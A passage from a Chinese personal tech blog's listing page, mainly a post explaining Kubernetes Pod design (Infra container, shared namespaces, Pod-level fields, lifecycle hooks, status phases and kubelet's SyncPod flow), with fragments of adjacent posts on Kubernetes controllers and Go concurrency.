<p>Informer 和 Reflector 之间使用一个增量先进先出队列来协同，而Informer 与控制循环之间则使用一个工作队列来协同。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li><a href="https://time.geekbang.org/column/article/40583" target="_blank" rel="noopener">谈谈控制器模型 — 极客时间</a></li>
<li><a href="https://time.geekbang.org/column/article/41876" target="_blank" rel="noopener">声明式 API — 极客时间</a></li>
<li><a href="https://time.geekbang.org/column/article/42076" target="_blank" rel="noopener">编写自定义控制器 — 极客时间</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2020/05/16/Kubernetes-Pod-%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/05/16/Kubernetes-Pod-%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/index/" class="post-title-link" itemprop="url">Kubernetes Pod 的设计与实现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-05-16 12:26:00" itemprop="dateCreated datePublished" datetime="2020-05-16T12:26:00+08:00">2020-05-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-26 10:22:16" itemprop="dateModified" datetime="2020-06-26T10:22:16+08:00">2020-06-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/computer-science/" itemprop="url" rel="index"><span itemprop="name">计算机科学</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2020/05/16/Kubernetes-Pod-%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/index/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/05/16/Kubernetes-Pod-的设计与实现/index/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="为什么需要-Pod"><a href="#为什么需要-Pod" class="headerlink" title="为什么需要 Pod"></a>为什么需要 Pod</h2><p>Pod 是 Kubernetes 项目中最小的 API 对象；是 Kubernetes 项目的原子调度单位。但是，为什么需要 Pod 呢？</p>
<p>在学习容器本质后，我们都知道：</p>
<blockquote>
<p>Namespace 做隔离，Cgroups 做限制，rootfs 作为文件系统。</p>
</blockquote>
<p>Pod 存在的必要性是什么呢？</p>
<p>Pod 存在的主要目的为：1. 抽象进程组概念 2. 引入“容器设计模式”</p>
<p>Pod 对“进程组”概念进行了抽象。如果说容器的本质是云计算系统中的进程，那么 Kubernetes 就相当于云计算的操作系统。在一个真正的操作系统里，如果在终端输入 <code>pstree</code> 命令，就可以以树形结构展示系统中的进程。这时我们可以发现进程通常并不是独自运行，而是被有组织地组合在一起。如用于处理系统日志中的 rsyslogd，与内核日志模块 imklog 同属于一个进程组，他们协作完成日志的收集。Kubernetes 的很多设计思想来源与 Google 内部系统 Borg，在 Borg 的实践过程中，工程师就发现应用之间通常存在类似于“进程组”的关系，它们密切协作，必须部署在同一台机器上。如果存在了“组”的概念，那么就能很好地处理这样的运维关系，Kubernetes 按照 Pod 的资源需求进行计算进行资源调度。所以，Kubernetes 使用 Pod 将“进程组”的概念映射到了容器技术中，使其成为云计算“操作系统”里面的“一等公民”。</p>
<p>Pod 引入了“容器设计模式”。Pod 本身仅仅是一个逻辑概念。Kubernetes 仍然是使用 Namespace 和 Cgroups 实现资源的隔离和限制，而并不存在一个「Pod 边界」。Pod 里的所有容器，共享同一个 Network Namespace，并且能够声明共享同一个 Volume。如果共享网络配置及 Volume 是通过类似运行 docker run 命令来实现，如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --net&#x3D;other --volumes-from&#x3D;other --name&#x3D;this ...</span><br></pre></td></tr></table></figure>

<p>那么一个容器就必须比另外一个容器先启动，这样容器间就成为了拓扑关系，而不是对等关系了。所以，在 Kubernetes 中，Pod 使用了一个中间容器 Infra，Infra 一定是在 Pod 中首先被创建的容器，而其他容器则通过 Join Network Namespace 的方式与 Infra 容器关联在一起。</p>
<p><img src="/images/2020-05-16/pod.png" alt="Pod"></p>
<p>Infra 容器使用一个特殊的镜像，叫做：<code>k8s.gcr.io/pause</code>，它占用极少的资源。Infra 容器被创建后会初始化 Network Namespace，之后用户容器就可以加入到 Infra 容器中了。所以对于 Pod 中的容器 A 和 B 来说，它们：</p>
<ol>
<li>能够直接使用 localhost 通信；</li>
<li>看到与 Infra 容器相同的网络设备</li>
<li>Pod 只有一个 IP 地址，也就是该 Pod 的 Network Namespace 对应的 IP 地址；</li>
<li>所有网络资源均一个 Pod 一份，被 Pod 中所有容器共享；</li>
<li>Pod 的生命周期仅与 Infra 容器一致，与用户容器无关。</li>
</ol>
<p>对于同一个 Pod 中的用户来说，它们的进出流量可以认为都是通过 Infra 容器完成的。所以当进行网络插件开发时，应该主要考虑如何配置 Pod 的 Network Namespace，而不是去配置用户容器。</p>
<p>有了使用 Infra 容器的设置后，共享的 Volume 也就成为了 Pod 层级的字段。这样 Volume 对应的宿主机目录对于 Pod 来说只有一个，Pod 中的容器只要声明挂载这个 Volume，就一定可以共享这个 Volume 对应的宿主机目录。</p>
<p><img src="/images/2020-05-16/pod_share_volume.png" alt="pod-share-volumes"></p>
<p>Pod 的设计希望当用户想在一个容器里面运行多个功能不相关，但是关系紧密的应用时，应该优先考虑它们是不是更应该被描述成一个 Pod 里的多个容器。</p>
<p>所以，当进行业务「上云」的时候，应该把整个虚拟机想象成一个 Pod，把这些进程分别做成容器镜像，把存在顺序关系的容器定义为 Init Container。这样就实现了更加合理的，容耦合的容器编排方法。</p>
<blockquote>
<p>Pod 提供的是一种编排思想，而不是具体的技术方案。</p>
</blockquote>
<h2 id="Pod-对象的基本概念"><a href="#Pod-对象的基本概念" class="headerlink" title="Pod 对象的基本概念"></a>Pod 对象的基本概念</h2><p>Pod，而不是容器，是 Kubernetes 项目中的最小编排单位。如果将这个思想落实到 API 和数据接口定义上，那么容器就成为了 Pod 属性中一个普通的字段。那么，哪些属性应该放到 Pod 中，哪些应该放到 Container 中呢？</p>
<p>Pod 扮演了传统环境中的「虚拟机」角色，容器扮演了进程。理解了 Pod 的设计原则之后，我们就可以明白，在设计 Pod 数据结构时：</p>
<ol>
<li>凡是调度、网络、存储，以及安全相关的属性，基本上是 Pod 级别的；</li>
<li>凡是跟容器的 Linux Namespace 相关的属性，一定是 Pod 级别的；</li>
<li>凡是 Pod 中容器要共享宿主机的 Namespace，一定是 Pod 级别的；</li>
</ol>
<p>应用调度、网络、存储及安全相关的属性的共同特征是，它们描述“机器”这个整体，而不是里面的“程序”。</p>
<ul>
<li><strong>NodeSelector</strong>：供用户将 Pod 与 Node 进行绑定。</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">nodeSelector:</span></span><br><span class="line">    <span class="attr">disktype:</span> <span class="string">ssd</span></span><br></pre></td></tr></table></figure>

<p>这样的配置意味着 Pod 永远只能运行在携带了 <code>disktype:ssd</code> 标签（Label）的节点上；否则将会调度失败。</p>
<ul>
<li><p><strong>NodeName</strong>:：该字段一般由调度器负责设置，因为一旦 Pod 中的该字段被赋值，Kubernetes 就认为这个 Pod 已经经过了调度，调度的结果就是赋值的节点名字。但是用户可以设置它来“骗过”调度器，一般在测试和调试时这样做。</p>
</li>
<li><p><strong>NodeName</strong>：定义了 Pod 的 hosts 文件（/etc/hosts）中的内容。</p>
</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">hostAliases:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ip:</span> <span class="string">"10.1.2.3"</span></span><br><span class="line">    <span class="attr">hostnames:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">"foo.remote"</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">"bar.remote"</span></span><br></pre></td></tr></table></figure>

<p>当 Pod 启动后，生成的 /etc/hosts 文件的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;hosts</span><br><span class="line"># Kubernetes-managed hosts file.</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">...</span><br><span class="line">10.244.135.10 hostaliases-pod</span><br><span class="line">10.1.2.3 foo.remote</span><br><span class="line">10.1.2.3 bar.remote</span><br></pre></td></tr></table></figure>

<p>Linux Namespace 相关的属性，也一定是 Pod 级别的。因为 Pod 的设计原则就是希望其中的容器能够尽可能多地共享 Linux Namespace，仅保留必要的隔离和限制能力。这样 Pod 模拟出的效果会更加类似虚拟机中进程间的关系。</p>
<p>假如设置 <code>sharePrecessNamespace=true</code>：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">shareProcessNamespace:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">shell</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">stdin:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">tty:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>就意味着 Pod 中的容器要共享 PID Namespace。之后，在 busybox 容器中运行 <code>ps aux</code>，就不仅仅能够看到 ps 命令本身，还能够看到 nginx 容器的进程以及 pause 进程。这就意味着，整个 Pod 里的每个容器的进程，对于所有容器来说都是可见的。</p>
<p>凡是 Pod 中的容器要共享宿主机的 Namespace，也一定是 Pod 级别的。比如：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hostIPC:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hostPID:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">shell</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">stdin:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">tty:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>这个 Pod 中我们定义了共享宿主机的 Network、IPC 和 PID Namespace。这就意味着，这个 Pod 里面的所有容器，会直接使用宿主机的网络、直接与宿主机进行 IPC 通信、看到宿主机里面正在运行的所有进程。</p>
<p>在 Pod 中，最重要的就是 <code>Containers</code> 了，另外，<code>Init Container</code> 也属于 Pod 对容器的定义，内容和 <code>Container</code> 完全相同，只是 <code>Init Container</code> 的声明周期会限于所有的 <code>Containers</code>，并且严格按照顺序执行。</p>
<p>Kubernetes 对 Container 的定义，与 Docker 相比差别不大，主要有：Image，Command，workingDir，Ports，及 volumeMounts。另外需要注意的有：</p>
<ul>
<li><p><strong>ImagePullPolicy</strong>：定义了镜像的拉取策略，默认值是 <code>Always</code>，即每次创建 Pod 时都重新拉取镜像；如果它的值被定义为 <code>Never</code> 或者 <code>IfNotPresent</code>，则意味着 Pod 永远不会主动拉取这个镜像，或者只有当宿主机上不存在该镜像时才拉取。</p>
</li>
<li><p><strong>Lifecycle</strong>：定义了 Container Lifecycle Hooks，也就是容器状态发生变化时触发的一系列“钩子”。</p>
</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">lifecycle-demo</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">lifecycle-demo-container</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">lifecycle:</span></span><br><span class="line">      <span class="attr">postStart:</span></span><br><span class="line">        <span class="attr">exec:</span></span><br><span class="line">          <span class="attr">command:</span> <span class="string">["/bin/sh",</span> <span class="string">"-c"</span><span class="string">,</span> <span class="string">"echo Hello from the postStart handler &gt; /usr/share/message"</span><span class="string">]</span></span><br><span class="line">      <span class="attr">preStop:</span></span><br><span class="line">        <span class="attr">exec:</span></span><br><span class="line">          <span class="attr">command:</span> <span class="string">["/usr/sbin/nginx","-s","quit"]</span></span><br></pre></td></tr></table></figure>

<p>可以看到在 <code>Container</code> 中为 nginx 容器设置了 <code>postStart</code> 和 <code>preStop</code>，分别表示在容器启动后或者在容器被杀死前执行一个指定的操作。</p>
<p>Pod 生命周期的变化，主要体现在 Pod 的 <code>Status</code> 部分，这是它除了 <code>Metadata</code> 和 <code>Spec</code> 之外的第三重要的字段。其中，<code>pod.status.phase</code> 就是 Pod 的当前状态，它可能的情况有：</p>
<ol>
<li>Pending。表示 Pod 的 YAML 文件已经提交给了 Kubernetes，对象已经被创建被保存在了 Etcd 中。但是 Pod 中的有些容器因为某种原因而不能被顺利创建。</li>
<li>Running。表示 Pod 已经调度成功，其中包含的容器都已经创建成功，且至少有一个正在运行中。</li>
<li>Succeeded。表示 Pod 中所有的容器都已经正常运行完毕，并且已经退出了。这在 Job 对象中较常见。</li>
<li>Failed。表示 Pod 中至少有一个容器已不正常的状态（非 0 返回码）退出。</li>
<li>Unknown。表示一个异常状态，Pod 的状态不能持续地被 kubelet 汇报给 kube-apiserver，可能的原因是主从节点间的通信出现了问题。</li>
</ol>
<p>更进一步。Pod 的 Status 字段还可以再细分中一组 Conditions。细分的状态包括：PodScheduled、Ready、Initialized，以及 Unschedulable。它们主要用于描述造成当前 Status 的具体原因是什么。</p>
<h2 id="Pod-的实现原理"><a href="#Pod-的实现原理" class="headerlink" title="Pod 的实现原理"></a>Pod 的实现原理</h2><p>我们可以查看 Pod 数据结构的<a href="https://github.com/kubernetes/kubernetes/blob/4e8b56e6671893757d40e2001a3c615acebc13a2/staging/src/k8s.io/api/core/v1/types.go#L3549" target="_blank" rel="noopener">完整定义</a>，来进一步理解 Pod 的设计。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pod is a collection of containers that can run on a host. This resource is created</span></span><br><span class="line"><span class="comment">// by clients and scheduled onto hosts.</span></span><br><span class="line"><span class="keyword">type</span> Pod <span class="keyword">struct</span> &#123;</span><br><span class="line">	metav1.TypeMeta <span class="string">`json:",inline"`</span></span><br><span class="line">	<span class="comment">// Standard object's metadata.</span></span><br><span class="line">	<span class="comment">// More info: https://git.k8s.io/community/contributors/devel/sig-architecture/api-conventions.md#metadata</span></span><br><span class="line">	<span class="comment">// +optional</span></span><br><span class="line">	metav1.ObjectMeta <span class="string">`json:"metadata,omitempty" protobuf:"bytes,1,opt,name=metadata"`</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Specification of the desired behavior of the pod.</span></span><br><span class="line">	<span class="comment">// More info: https://git.k8s.io/community/contributors/devel/sig-architecture/api-conventions.md#spec-and-status</span></span><br><span class="line">	<span class="comment">// +optional</span></span><br><span class="line">	Spec PodSpec <span class="string">`json:"spec,omitempty" protobuf:"bytes,2,opt,name=spec"`</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Most recently observed status of the pod.</span></span><br><span class="line">	<span class="comment">// This data may not be up to date.</span></span><br><span class="line">	<span class="comment">// Populated by the system.</span></span><br><span class="line">	<span class="comment">// Read-only.</span></span><br><span class="line">	<span class="comment">// More info: https://git.k8s.io/community/contributors/devel/sig-architecture/api-conventions.md#spec-and-status</span></span><br><span class="line">	<span class="comment">// +optional</span></span><br><span class="line">	Status PodStatus <span class="string">`json:"status,omitempty" protobuf:"bytes,3,opt,name=status"`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与 Kubernetes 中任何一个 API 对象一样，Pod 首先也嵌入（embed）了 <code>TypeMeta</code> 和 <code>ObjectMeta</code> 属性。<code>TypeMeta</code> 中的 <code>apiVersion</code> 和 <code>kind</code> 描述了 API 组及资源类型，能够确定该对象应该由谁来处理。而 <code>metadata</code> 则为我们提供能够唯一识别对象的信息，包括集群中的 <code>namespace</code> 及在命名空间中唯一的 <code>name</code>，还有用于分类的 <code>labels</code> 字段及用于功能拓展的 <code>annotations</code> 字段。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> ObjectMeta <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name <span class="keyword">string</span></span><br><span class="line">	Namespace <span class="keyword">string</span></span><br><span class="line">	Labels <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span></span><br><span class="line">	Annotations <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span></span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中最重要的属性为 <a href="https://github.com/kubernetes/kubernetes/blob/4e8b56e6671893757d40e2001a3c615acebc13a2/staging/src/k8s.io/api/core/v1/types.go#L2842" target="_blank" rel="noopener">PodSpec</a> 的定义。它定义了 Pod 的期望状态，其中包含了大量本文中未介绍的属性。</p>
<p>Pod 的基本生命周期为，首先创建 Pod，之后进入健康检查状态，当 Kubernetes 确定 Pod 已经能够接受外部请求时，将流量打到新的 Pod 上并继续对外提供服务；如果 Pod 发生错误就触发重启机制。 </p>
<p>Pod 的在集群中的创建由 kubelet 完成，Pod 的创建过程的入口为 <a href="https://github.com/kubernetes/kubernetes/blob/4e8b56e6671893757d40e2001a3c615acebc13a2/pkg/kubelet/kuberuntime/kuberuntime_manager.go#L647" target="_blank" rel="noopener">SyncPod 方法</a>。</p>
<p>创建 Pod 的流程基本可以分为 6 步：</p>
<ol>
<li>计算 Pod 中沙盒和容器的变更；</li>
<li>强制停止 Pod 中对应的沙盒；</li>
<li>强制停止所有不应该运行的容器；</li>
<li>为 Pod 创建新的沙盒；</li>
<li>创建 PodSpec 中指定的初始化容器；</li>
<li>依次创建 PodSpec 中指定的常规容器； </li>
</ol>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *kubeGenericRuntimeManager)</span> <span class="title">SyncPod</span><span class="params">(pod *v1.Pod, podStatus *kubecontainer.PodStatus, pullSecrets []v1.Secret, backOff *flowcontrol.Backoff)</span> <span class="params">(result kubecontainer.PodSyncResult)</span></span> &#123;</span><br><span class="line">    podContainerChanges := m.computePodActions(pod, podStatus)</span><br><span class="line">    <span class="keyword">if</span> podContainerChanges.CreateSandbox &#123;</span><br><span class="line">		ref, _ := ref.GetReference(legacyscheme.Scheme, pod)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> podContainerChanges.KillPod &#123;</span><br><span class="line">		<span class="keyword">if</span> podContainerChanges.CreateSandbox &#123;</span><br><span class="line">			m.purgeInitContainers(pod, podStatus)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> containerID, containerInfo := <span class="keyword">range</span> podContainerChanges.ContainersToKill &#123;</span><br><span class="line">			m.killContainer(pod, containerID, containerInfo.name, containerInfo.message, <span class="literal">nil</span>)			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	podSandboxID := podContainerChanges.SandboxID</span><br><span class="line">	<span class="keyword">if</span> podContainerChanges.CreateSandbox &#123;</span><br><span class="line">		podSandboxID, _, _ = m.createPodSandbox(pod, podContainerChanges.Attempt)</span><br><span class="line">	&#125;</span><br><span class="line">	podSandboxConfig, _ := m.generatePodSandboxConfig(pod, podContainerChanges.Attempt)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> container := podContainerChanges.NextInitContainerToStart; container != <span class="literal">nil</span> &#123;</span><br><span class="line">		msg, _ := m.startContainer(podSandboxID, podSandboxConfig, container, pod, podStatus, pullSecrets, podIP, kubecontainer.ContainerTypeInit)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, idx := <span class="keyword">range</span> podContainerChanges.ContainersToStart &#123;</span><br><span class="line">		container := &amp;pod.Spec.Containers[idx]</span><br><span class="line">		msg, _ := m.startContainer(podSandboxID, podSandboxConfig, container, pod, podStatus, pullSecrets, podIP, kubecontainer.ContainerTypeRegular)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，Pod 的创建流程首先是计算 Pod规格和沙箱的变更，然后停止所有可能影响这一次创建或更新的容器，最后依次创建沙盒、初始化容器和常规容器。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li><a href="https://time.geekbang.org/column/intro/116" target="_blank" rel="noopener">深入剖析 Kubernetes — 极客时间</a></li>
<li><a href="https://draveness.me/kubernetes-pod/" target="_blank" rel="noopener">详解 Kubernetes 的实现原理</a></li>
<li><a href="https://kubernetes.io/docs/concepts/workloads/pods/pod/" target="_blank" rel="noopener">Pod — Kubernetes</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2019/12/22/concurrency-patterns-in-go/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/12/22/concurrency-patterns-in-go/" class="post-title-link" itemprop="url">Go 语言中的常用并发模式</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-12-22 10:34:23" itemprop="dateCreated datePublished" datetime="2019-12-22T10:34:23+08:00">2019-12-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-26 10:22:16" itemprop="dateModified" datetime="2020-06-26T10:22:16+08:00">2020-06-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/programming-language/" itemprop="url" rel="index"><span itemprop="name">编程语言</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2019/12/22/concurrency-patterns-in-go/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/12/22/concurrency-patterns-in-go/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>正式工作半年来，公司项目以 Go 作为主要语言。由于有 C 语言基础，刚开始我感觉上手 Go 语言很容易，而且比 C 语言有更好的可读性，再加上「函数」变成了一等公民，函数式的写法也让部分功能的实现变得更加简练和易读。但是，我对 Go 语言的并发特性却一直理解不深，总觉得在处理并发任务的时候我的思路依然是使用 Java 的 <em>communicate by sharing memory</em>，而不是 Go 语言所提倡的 <em>share memory by communicating</em>。所以，近期阅读和实践了一些 Go 语言并发编程相关的书籍和资料，总结了 Go 语言中常用的并发编程模式，记录在这里。</p>
